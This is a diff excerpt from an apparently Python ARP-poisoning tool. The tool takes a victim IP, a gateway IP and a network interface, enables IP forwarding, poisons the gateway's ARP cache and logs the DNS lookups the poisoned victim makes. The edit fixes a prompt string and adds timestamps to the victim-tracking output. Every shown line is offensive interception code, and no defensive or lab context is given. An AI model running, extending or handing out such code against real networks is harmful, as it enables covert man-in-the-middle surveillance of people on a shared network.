@@ -16,7 +16,7 @@ print colored("..::::..:::......:::..::::::::::.......::::.......:::..::::::::\n
 vIP = raw_input("Victims IP: ")
 gIP = raw_input("Gateway IP: ")
 interface = raw_input("Interface to use: ")
-path = raw_input("Enter path of ip forwarding config file (put \"d\" for default \"/proc/sys/net/ipv4/ip_forward\":")
+path = raw_input("Enter path of ip forwarding config file (put \"d\" for default \"/proc/sys/net/ipv4/ip_forward\"):")
 if path == "d":
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 else:
@@ -38,7 +38,7 @@ def reArp():
 
 def handle_dns(pkt):
 	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt.getlayer(IP).src == vIP:
-		print colored("Poisoned victim " + pkt.getlayer(IP).src + " has visited " + pkt.getlayer(DNS).qd.qname + "\n", "blue")
+		print colored("Poisoned victim " + pkt.getlayer(IP).src + " has visited " + pkt.getlayer(DNS).qd.qname + " - " + time.strftime("%H:%M:%S") + "\n", "blue")
 
 def poisonGateway():
 	gMac = MACsnag(gIP)
